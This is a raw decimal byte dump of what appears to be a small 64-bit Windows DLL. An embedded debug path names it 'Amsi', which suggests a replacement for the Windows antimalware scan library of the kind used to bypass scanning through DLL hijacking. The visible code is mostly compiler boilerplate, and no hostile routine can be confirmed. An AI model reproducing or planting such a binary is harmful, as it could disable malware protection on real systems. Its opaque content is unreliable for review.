87 72 131 236 32 72 139 29 233 13 0 0 73 139 248 139 242 72 139 233 72 133 219 117 5 141 67 1 235 18 72 139 203 232 127 8 0 0 76 139 199 139 214 72 139 205 255 211 72 139 92 36 48 72 139 108 36 56 72 139 116 36 64 72 131 196 32 95 195 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 73 139 248 139 218 72 139 241 131 250 1 117 5 232 99 5 0 0 76 139 199 139 211 72 139 206 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 233 103 254 255 255 204 204 204 64 83 72 131 236 32 72 139 217 51 201 255 21 119 12 0 0 72 139 203 255 21 6 12 0 0 255 21 32 12 0 0 72 139 200 186 9 4 0 192 72 131 196 32 91 72 255 37 76 12 0 0 72 137 76 36 8 72 131 236 56 185 23 0 0 0 232 13 10 0 0 133 192 116 7 185 2 0 0 0 205 41 72 141 13 183 28 0 0 232 170 0 0 0 72 139 68 36 56 72 137 5 158 29 0 0 72 141 68 36 56 72 131 192 8 72 137 5 46 29 0 0 72 139 5 135 29 0 0 72 137 5 248 27 0 0 72 139 68 36 64 72 137 5 252 28 0 0 199 5 210 27 0 0 9 4 0 192 199 5 204 27 0 0 1 0 0 0 199 5 214 27 0 0 1 0 0 0 184 8 0 0 0 72 107 192 0 72 141 13 206 27 0 0 72 199 4 1 2 0 0 0 184 8 0 0 0 72 107 192 0 72 139 13 70 27 0 0 72 137 76 4 32 184 8 0 0 0 72 107 192 1 72 139 13 57 27 0 0 72 137 76 4 32 72 141 13 125 12 0 0 232 0 255 255 255 72 131 196 56 195 204 204 204 64 83 86 87 72 131 236 64 72 139 217 255 21 31 11 0 0 72 139 179 248 0 0 0 51 255 69 51 192 72 141 84 36 96 72 139 206 255 21 253 10 0 0 72 133 192 116 57 72 131 100 36 56 0 72 141 76 36 104 72 139 84 36 96 76 139 200 72 137 76 36 48 76 139 198 72 141 76 36 112 72 137 76 36 40 51 201 72 137 92 36 32 255 21 190 10 0 0 255 199 131 255 2 124 177 72 131 196 64 95 94 91 195 204 204 204 72 131 236 40 232 103 8 0 0 133 192 116 33 101 72 139 4 37 48 0 0 0 72 139 72 8 235 5 72 59 200 116 20 51 192 240 72 15 177 13 64 32 0 0 117 238 50 192 72 131 196 40 195 176 1 235 247 204 204 204 72 131 236 40 232 43 8 0 0 133 192 116 7 232 94 6 0 0 235 5 232 95 8 0 0 176 1 72 131 196 40 195 72 131 236 40 51 201 232 65 1 0 0 132 192 15 149 192 72 131 196 40 195 204 204 204 72 131 236 40 232 99 8 0 0 132 192 117 4 50 192 235 18 232 86 8 0 0 132 192 117 7 232 77 8 0 0 235 236 176 1 72 131 196 40 195 72 131 236 40 232 59 8 0 0 232 54 8 0 0 176 1 72 131 196 40 195 204 204 204 72 137 92 36 8 72 137 108 36 16 72 137 116 36 24 87 72 131 236 32 73 139 249 73 139 240 139 218 72 139 233 232 152 7 0 0 133 192 117 23 131 251 1 117 18 72 139 207 232 187 5 0 0 76 139 198 51 210 72 139 205 255 215 72 139 84 36 88 139 76 36 80 72 139 92 36 48 72 139 108 36 56 72 139 116 36 64 72 131 196 32 95 233 153 7 0 0 204 204 204 72 131 236 40 232 79 7 0 0 133 192 116 16 72 141 13 72 31 0 0 72 131 196 40 233 145 7 0 0 232 106 249 255 255 133 192 117 5 232 143 7 0 0 72 131 196 40 195 72 131 236 40 51 201 232 141 7 0 0 72 131 196 40 233 132 7 0 0 64 83 72 131 236 32 15 182 5 59 31 0 0 133 201 187 1 0 0 0 15 68 195 136 5 43 31 0 0 232 46 5 0 0 232 93 7 0 0 132 192 117 4 50 192 235 20 232 80 7 0 0 132 192 117 9 51 201 232 69 7 0 0 235 234 138 195 72 131 196 32 91 195 204 204 204 72 137 92 36 8 85 72 139 236 72 131 236 64 139 217 131 249 1 15 135 166 0 0 0 232 171 6 0 0 133 192 116 43 133 219 117 39 72 141 13 160 30 0 0 232 225 6 0 0 133 192 116 4 50 192 235 122 72 141 13 164 30 0 0 232 205 6 0 0 133 192 15 148 192 235 103 72 139 21 169 24 0 0 73 131 200 255 139 194 185 64 0 0 0 131 224 63 43 200 176 1 73 211 200 76 51 194 76 137 69 224 76 137 69 232 15 16 69 224 76 137 69 240 242 15 16 77 240 15 17 5 69 30 0 0 76 137 69 224 76 137 69 232 15 16 69 224 76 137 69 240 242 15 17 13 61 30 0 0 242 15 16 77 240 15 17 5 57 30 0 0 242 15 17 13 65 30 0 0 72 139 92 36 80 72 131 196 64 93 195 185 5 0 0 0 232 84 2 0 0 204 204 204 204 72 131 236 24 76 139 193 184 77 90 0 0 102 57 5 29 232 255 255 117 124 72 99 5 80 232 255 255 72 141 21 13 232 255 255 72 141 12 16 129 57 80 69 0 0 117 98 184 11 2 0 0 102 57 65 24 117 87 76 43 194 15 183 65 20 72 141 81 24 72 3 208 15 183 65 6 72 141 12 128 76 141 12 202 72 137 20 36 73 59 209 116 24 139 74 12 76 59 193 114 10 139 66 8 3 193 76 59 192 114 8 72 131 194 40 235 223 51 210 72 133 210 117 4 50 192 235 23 247 66 36 0 0 0 128 116 4 50 192 235 10 176 1 235 6 50 192 235 2 50 192 72 131 196 24 195 64 83 72 131 236 32 138 217 232 83 5 0 0 51 210 133 192 116 11 132 219 117 7 72 135 21 62 29 0 0 72 131 196 32 91 195 64 83 72 131 236 32 128 61 99 29 0 0 0 138 217 116 4 132 210 117 14 138 203 232 144 5 0 0 138 203 232 137 5 0 0 176 1 72 131 196 32 91 195 204 64 83 72 131 236 32 72 139 21 55 23 0 0 72 139 217 139 202 72 51 21 251 28 0 0 131 225 63 72 211 202 72 131 250 255 117 10 72 139 203 232 63 5 0 0 235 15 72 139 211 72 141 13 219 28 0 0 232 34 5 0 0 51 201 133 192 72 15 68 203 72 139 193 72 131 196 32 91 195 204 72 131 236 40 232 167 255 255 255 72 247 216 27 192 247 216 255 200 72 131 196 40 195 204 72 137 92 36 32 85 72 139 236 72 131 236 32 72 131 101 24 0 72 187 50 162 223 45 153 43 0 0 72 139 5 185 22 0 0 72 59 195 117 111 72 141 77 24 255 21 226 6 0 0 72 139 69 24 72 137 69 16 255 21 220 6 0 0 139 192 72 49 69 16 255 21 216 6 0 0 139 192 72 141 77 32 72 49 69 16 255 21 208 6 0 0 139 69 32 72 141 77 16 72 193 224 32 72 51 69 32 72 51 69 16 72 51 193 72 185 255 255 255 255 255 255 0 0 72 35 193 72 185 51 162 223 45 153 43 0 0 72 59 195 72 15 68 193 72 137 5 69 22 0 0 72 139 92 36 72 72 247 208 72 137 5 62 22 0 0 72 131 196 32 93 195 72 141 13 57 28 0 0 72 255 37 82 6 0 0 204 204 72 141 13 41 28 0 0 233 6 4 0 0 72 141 5 45 28 0 0 195 72 141 5 45 28 0 0 195 72 131 236 40 232 231 255 255 255 72 131 8 4 232 230 255 255 255 72 131 8 2 72 131 196 40 195 204 72 141 5 25 28 0 0 195 72 137 92 36 8 85 72 141 172 36 64 251 255 255 72 129 236 192 5 0 0 139 217 185 23 0 0 0 232 243 3 0 0 133 192 116 4 139 203 205 41 131 37 224 27 0 0 0 72 141 77 240 51 210 65 184 208 4 0 0 232 151 3 0 0 72 141 77 240 255 21 173 5 0 0 72 139 157 232 0 0 0 72 141 149 216 4 0 0 72 139 203 69 51 192 255 21 139 5 0 0 72 133 192 116 60 72 131 100 36 56 0 72 141 141 224 4 0 0 72 139 149 216 4 0 0 76 139 200 72 137 76 36 48 76 139 195 72 141 141 232 4 0 0 72 137 76 36 40 72 141 77 240 72 137 76 36 32 51 201 255 21 66 5 0 0 72 139 133 200 4 0 0 72 141 76 36 80 72 137 133 232 0 0 0 51 210 72 141 133 200 4 0 0 65 184 152 0 0 0 72 131 192 8 72 137 133 136 0 0 0 232 0 3 0 0 72 139 133 200 4 0 0 72 137 68 36 96 199 68 36 80 21 0 0 64 199 68 36 84 1 0 0 0 255 21 14 5 0 0 131 248 1 72 141 68 36 80 72 137 68 36 64 72 141 69 240 15 148 195 72 137 68 36 72 51 201 255 21 45 5 0 0 72 141 76 36 64 255 21 186 4 0 0 133 192 117 10 246 219 27 192 33 5 220 26 0 0 72 139 156 36 208 5 0 0 72 129 196 192 5 0 0 93 195 204 204 204 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 72 141 29 154 9 0 0 72 141 53 147 9 0 0 235 22 72 139 59 72 133 255 116 10 72 139 207 232 105 0 0 0 255 215 72 131 195 8 72 59 222 114 229 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 195 204 204 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 72 141 29 94 9 0 0 72 141 53 87 9 0 0 235 22 72 139 59 72 133 255 116 10 72 139 207 232 29 0 0 0 255 215 72 131 195 8 72 59 222 114 229 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 195 204 204 72 255 37 241 4 0 0 204 72 137 92 36 16 85 72 139 236 72 131 236 32 131 101 232 0 51 201 51 192 199 5 245 19 0 0 2 0 0 0 15 162 68 139 193 199 5 226 19 0 0 1 0 0 0 65 129 240 110 116 101 108 68 139 202 65 129 241 105 110 101 73 68 139 210 69 11 200 139 211 129 242 71 101 110 117 68 139 216 68 11 202 184 1 0 0 0 65 15 148 192 129 241 99 65 77 68 129 243 65 117 116 104 65 129 242 101 110 116 105 65 11 218 11 217 65 15 148 194 51 201 15 162 68 139 201 137 69 240 69 132 192 68 137 77 248 68 139 5 156 25 0 0 139 200 137 93 244 137 85 252 116 82 72 131 13 118 19 0 0 255 65 131 200 4 37 240 63 255 15 68 137 5 122 25 0 0 61 192 6 1 0 116 40 61 96 6 2 0 116 33 61 112 6 2 0 116 26 5 176 249 252 255 131 248 32 119 27 72 187 1 0 1 0 1 0 0 0 72 15 163 195 115 11 65 131 200 1 68 137 5 64 25 0 0 69 132 210 116 25 129 225 0 15 240 15 129 249 0 15 96 0 124 11 65 131 200 4 68 137 5 34 25 0 0 184 7 0 0 0 137 85 224 68 137 77 228 68 59 216 124 36 51 201 15 162 137 69 240 137 93 244 137 77 248 137 85 252 137 93 232 15 186 227 9 115 11 65 131 200 2 68 137 5 237 24 0 0 65 15 186 225 20 115 110 199 5 192 18 0 0 2 0 0 0 199 5 186 18 0 0 6 0 0 0 65 15 186 225 27 115 83 65 15 186 225 28 115 76 51 201 15 1 208 72 193 226 32 72 11 208 72 137 85 16 72 139 69 16 36 6 60 6 117 50 139 5 140 18 0 0 131 200 8 199 5 123 18 0 0 3 0 0 0 246 69 232 32 137 5 117 18 0 0 116 19 131 200 32 199 5 98 18 0 0 5 0 0 0 137 5 96 18 0 0 51 192 72 139 92 36 56 72 131 196 32 93 195 204 204 204 51 192 57 5 92 18 0 0 15 149 192 195 194 0 0 204 204 204 204 204 255 37 178 2 0 0 255 37 164 2 0 0 255 37 150 2 0 0 255 37 136 2 0 0 255 37 122 2 0 0 255 37 228 2 0 0 255 37 214 2 0 0 255 37 200 2 0 0 255 37 186 2 0 0 255 37 172 2 0 0 255 37 158 2 0 0 255 37 144 2 0 0 255 37 130 2 0 0 255 37 116 2 0 0 255 37 30 2 0 0 204 204 176 1 195 204 204 204 204 204 204 204 102 102 15 31 132 0 0 0 0 0 255 224 64 85 72 131 236 32 72 139 234 138 77 64 72 131 196 32 93 233 4 250 255 255 204 64 85 72 131 236 32 72 139 234 232 45 248 255 255 138 77 56 72 131 196 32 93 233 232 249 255 255 204 64 85 72 131 236 48 72 139 234 72 139 1 139 16 72 137 76 36 40 137 84 36 32 76 141 13 161 241 255 255 76 139 69 112 139 85 104 72 139 77 96 232 93 247 255 255 144 72 131 196 48 93 195 204 64 85 72 139 234 72 139 1 51 201 129 56 5 0 0 192 15 148 193 139 193 93 195 204 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 106 41 0 0 0 0 0 0 86 41 0 0 0 0 0 0 60 41 0 0 0 0 0 0 40 41 0 0 0 0 0 0 164 41 0 0 0 0 0 0 94 42 0 0 0 0 0 0 72 42 0 0 0 0 0 0 46 42 0 0 0 0 0 0 24 42 0 0 0 0 0 0 2 42 0 0 0 0 0 0 232 41 0 0 0 0 0 0 204 41 0 0 0 0 0 0 184 41 0 0 0 0 0 0 134 41 0 0 0 0 0 0 0 0 0 0 0 0 0 0 52 40 0 0 0 0 0 0 20 40 0 0 0 0 0 0 252 39 0 0 0 0 0 0 218 39 0 0 0 0 0 0 184 39 0 0 0 0 0 0 0 0 0 0 0 0 0 0 252 40 0 0 0 0 0 0 238 40 0 0 0 0 0 0 214 40 0 0 0 0 0 0 186 40 0 0 0 0 0 0 158 40 0 0 0 0 0 0 124 40 0 0 0 0 0 0 106 40 0 0 0 0 0 0 92 40 0 0 0 0 0 0 80 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 216 29 0 128 1 0 0 0 80 30 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 48 0 128 1 0 0 0 240 48 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 136 29 62 87 0 0 0 0 2 0 0 0 65 0 0 0 116 34 0 0 116 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 12 0 0 0 20 0 0 0 184 34 0 0 184 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 13 0 0 0 68 2 0 0 204 34 0 0 204 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 14 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 148 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 48 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 248 32 0 128 1 0 0 0 0 33 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 82 83 68 83 42 80 223 113 29 247 64 69 188 37 18 40 145 144 25 190 50 0 0 0 67 58 92 68 101 118 101 108 111 112 109 101 110 116 92 65 109 115 105 92 120 54 52 92 82 101 108 101 97 115 101 92 65 109 115 105 46 112 100 98 0 0 0 0 0 0 0 0 18 0 0 0 18 0 0 0 1 0 0 0 17 0 0 0 71 67 84 76 0 16 0 0 63 14 0 0 46 116 101 120 116 36 109 110 0 0 0 0 64 30 0 0 18 0 0 0 46 116 101 120 116 36 109 110 36 48 48 0 82 30 0 0 129 0 0 0 46 116 101 120 116 36 120 0 0 32 0 0 248 0 0 0 46 105 100 97 116 97 36 53 0 0 0 0 248 32 0 0 16 0 0 0 46 48 48 99 102 103 0 0 8 33 0 0 8 0 0 0 46 67 82 84 36 88 67 65 0 0 0 0 16 33 0 0 8 0 0 0 46 67 82 84 36 88 67 90 0 0 0 0 24 33 0 0 8 0 0 0 46 67 82 84 36 88 73 65 0 0 0 0 32 33 0 0 8 0 0 0 46 67 82 84 36 88 73 90 0 0 0 0 40 33 0 0 8 0 0 0 46 67 82 84 36 88 80 65 0 0 0 0 48 33 0 0 8 0 0 0 46 67 82 84 36 88 80 90 0 0 0 0 56 33 0 0 8 0 0 0 46 67 82 84 36 88 84 65 0 0 0 0 64 33 0 0 8 0 0 0 46 67 82 84 36 88 84 90 0 0 0 0 80 33 0 0 36 1 0 0 46 114 100 97 116 97 0 0 116 34 0 0 156 2 0 0 46 114 100 97 116 97 36 122 122 122 100 98 103 0 0 0 16 37 0 0 8 0 0 0 46 114 116 99 36 73 65 65 0 0 0 0 24 37 0 0 8 0 0 0 46 114 116 99 36 73 90 90 0 0 0 0 32 37 0 0 8 0 0 0 46 114 116 99 36 84 65 65 0 0 0 0 40 37 0 0 8 0 0 0 46 114 116 99 36 84 90 90 0 0 0 0 48 37 0 0 60 1 0 0 46 120 100 97 116 97 0 0 108 38 0 0 60 0 0 0 46 105 100 97 116 97 36 50 0 0 0 0 168 38 0 0 20 0 0 0 46 105 100 97 116 97 36 51 0 0 0 0 192 38 0 0 248 0 0 0 46 105 100 97 116 97 36 52 0 0 0 0 184 39 0 0 200 2 0 0 46 105 100 97 116 97 36 54 0 0 0 0 0 48 0 0 52 0 0 0 46 100 97 116 97 0 0 0 64 48 0 0 0 6 0 0 46 98 115 115 0 0 0 0 0 64 0 0 176 1 0 0 46 112 100 97 116 97 0 0 0 80 0 0 16 0 0 0 46 103 102 105 100 115 36 121 0 0 0 0 0 96 0 0 88 0 0 0 46 114 115 114 99 36 48 49 0 0 0 0 96 96 0 0 128 1 0 0 46 114 115 114 99 36 48 50 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 17 21 8 0 21 116 9 0 21 100 7 0 21 52 6 0 21 50 17 224 236 29 0 0 1 0 0 0 207 16 0 0 92 17 0 0 82 30 0 0 0 0 0 0 17 15 6 0 15 100 8 0 15 52 6 0 15 50 11 112 236 29 0 0 1 0 0 0 246 17 0 0 20 18 0 0 105 30 0 0 0 0 0 0 1 6 2 0 6 50 2 80 1 20 8 0 20 100 8 0 20 84 7 0 20 52 6 0 20 50 16 112 9 26 6 0 26 52 15 0 26 114 22 224 20 112 19 96 236 29 0 0 1 0 0 0 102 18 0 0 54 19 0 0 133 30 0 0 54 19 0 0 1 6 2 0 6 82 2 80 1 9 1 0 9 98 0 0 1 8 4 0 8 114 4 112 3 96 2 48 9 4 1 0 4 34 0 0 236 29 0 0 1 0 0 0 215 23 0 0 101 24 0 0 187 30 0 0 101 24 0 0 1 2 1 0 2 80 0 0 1 4 1 0 4 66 0 0 1 6 2 0 6 50 2 48 1 13 4 0 13 52 10 0 13 114 6 80 1 13 4 0 13 52 9 0 13 50 6 80 1 21 5 0 21 52 186 0 21 1 184 0 6 80 0 0 1 15 6 0 15 100 7 0 15 52 6 0 15 50 11 112 1 13 4 0 13 52 7 0 13 50 6 80 0 0 0 0 1 0 0 0 56 39 0 0 0 0 0 0 0 0 0 0 62 40 0 0 120 32 0 0 104 39 0 0 0 0 0 0 0 0 0 0 6 41 0 0 168 32 0 0 192 38 0 0 0 0 0 0 0 0 0 0 114 42 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 106 41 0 0 0 0 0 0 86 41 0 0 0 0 0 0 60 41 0 0 0 0 0 0 40 41 0 0 0 0 0 0 164 41 0 0 0 0 0 0 94 42 0 0 0 0 0 0 72 42 0 0 0 0 0 0 46 42 0 0 0 0 0 0 24 42 0 0 0 0 0 0 2 42 0 0 0 0 0 0 232 41 0 0 0 0 0 0 204 41 0 0 0 0 0 0 184 41 0 0 0 0 0 0 134 41 0 0 0 0 0 0 0 0 0 0 0 0 0 0 52 40 0 0 0 0 0 0 20 40 0 0 0 0 0 0 252 39 0 0 0 0 0 0 218 39 0 0 0 0 0 0 184 39 0 0 0 0 0 0 0 0 0 0 0 0 0 0 252 40 0 0 0 0 0 0 238 40 0 0 0 0 0 0 214 40 0 0 0 0 0 0 186 40 0 0 0 0 0 0 158 40 0 0 0 0 0 0 124 40 0 0 0 0 0 0 106 40 0 0 0 0 0 0 92 40 0 0 0 0 0 0 80 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 40 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 105 110 118 111 107 101 95 116 114 105 103 103 101 114 0 41 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 114 101 116 117 114 110 95 116 114 105 103 103 101 114 0 8 0 95 95 67 95 115 112 101 99 105 102 105 99 95 104 97 110 100 108 101 114 0 0 37 0 95 95 115 116 100 95 116 121 112 101 95 105 110 102 111 95 100 101 115 116 114 111 121 95 108 105 115 116 0 0 62 0 109 101 109 115 101 116 0 0 86 67 82 85 78 84 73 77 69 49 52 48 46 100 108 108 0 0 54 0 95 105 110 105 116 116 101 114 109 0 55 0 95 105 110 105 116 116 101 114 109 95 101 0 63 0 95 115 101 104 95 102 105 108 116 101 114 95 100 108 108 0 51 0 95 105 110 105 116 105 97 108 105 122 101 95 110 97 114 114 111 119 95 101 110 118 105 114 111 110 109 101 110 116 0 0 52 0 95 105 110 105 116 105 97 108 105 122 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 0 60 0 95 114 101 103 105 115 116 101 114 95 111 110 101 120 105 116 95 102 117 110 99 116 105 111 110 0 34 0 95 101 120 101 99 117 116 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 30 0 95 99 114 116 95 97 116 101 120 105 116 0 22 0 95 99 101 120 105 116 0 0 97 112 105 45 109 115 45 119 105 110 45 99 114 116 45 114 117 110 116 105 109 101 45 108 49 45 49 45 48 46 100 108 108 0 174 4 82 116 108 67 97 112 116 117 114 101 67 111 110 116 101 120 116 0 181 4 82 116 108 76 111 111 107 117 112 70 117 110 99 116 105 111 110 69 110 116 114 121 0 0 188 4 82 116 108 86 105 114 116 117 97 108 85 110 119 105 110 100 0 0 146 5 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 0 82 5 83 101 116 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 15 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 0 112 5 84 101 114 109 105 110 97 116 101 80 114 111 99 101 115 115 0 0 112 3 73 115 80 114 111 99 101 115 115 111 114 70 101 97 116 117 114 101 80 114 101 115 101 110 116 0 48 4 81 117 101 114 121 80 101 114 102 111 114 109 97 110 99 101 67 111 117 110 116 101 114 0 16 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 73 100 0 20 2 71 101 116 67 117 114 114 101 110 116 84 104 114 101 97 100 73 100 0 0 221 2 71 101 116 83 121 115 116 101 109 84 105 109 101 65 115 70 105 108 101 84 105 109 101 0 84 3 73 110 105 116 105 97 108 105 122 101 83 76 105 115 116 72 101 97 100 0 106 3 73 115 68 101 98 117 103 103 101 114 80 114 101 115 101 110 116 0 75 69 82 78 69 76 51 50 46 100 108 108 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 50 162 223 45 153 43 0 0 205 93 32 210 102 212 255 255 255 255 255 255 0 0 0 0 1 0 0 0 2 0 0 0 47 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 16 0 0 65 16 0 0 48 37 0 0 68 16 0 0 148 16 0 0 16 38 0 0 148 16 0 0 191 17 0 0 52 37 0 0 192 17 0 0 66 18 0 0 96 37 0 0 68 18 0 0 76 19 0 0 164 37 0 0 76 19 0 0 160 19 0 0 144 37 0 0 160 19 0 0 221 19 0 0 72 38 0 0 224 19 0 0 20 20 0 0 24 38 0 0 20 20 0 0 229 20 0 0 212 37 0 0 232 20 0 0 89 21 0 0 220 37 0 0 92 21 0 0 149 21 0 0 16 38 0 0 152 21 0 0 184 21 0 0 16 38 0 0 184 21 0 0 205 21 0 0 16 38 0 0 208 21 0 0 248 21 0 0 16 38 0 0 248 21 0 0 13 22 0 0 16 38 0 0 16 22 0 0 113 22 0 0 144 37 0 0 116 22 0 0 164 22 0 0 16 38 0 0 164 22 0 0 184 22 0 0 16 38 0 0 184 22 0 0 1 23 0 0 24 38 0 0 4 23 0 0 205 23 0 0 32 38 0 0 208 23 0 0 108 24 0 0 232 37 0 0 108 24 0 0 144 24 0 0 24 38 0 0 144 24 0 0 187 24 0 0 24 38 0 0 188 24 0 0 11 25 0 0 24 38 0 0 12 25 0 0 35 25 0 0 16 38 0 0 36 25 0 0 208 25 0 0 44 38 0 0 252 25 0 0 23 26 0 0 16 38 0 0 32 26 0 0 101 27 0 0 56 38 0 0 104 27 0 0 178 27 0 0 72 38 0 0 180 27 0 0 254 27 0 0 72 38 0 0 8 28 0 0 201 29 0 0 88 38 0 0 80 30 0 0 82 30 0 0 104 38 0 0 82 30 0 0 105 30 0 0 136 37 0 0 105 30 0 0 133 30 0 0 136 37 0 0 133 30 0 0 187 30 0 0 204 37 0 0 187 30 0 0 211 30 0 0 8 38 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 54 0 0 0 73 0 0 0 76 0 0 0 11 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 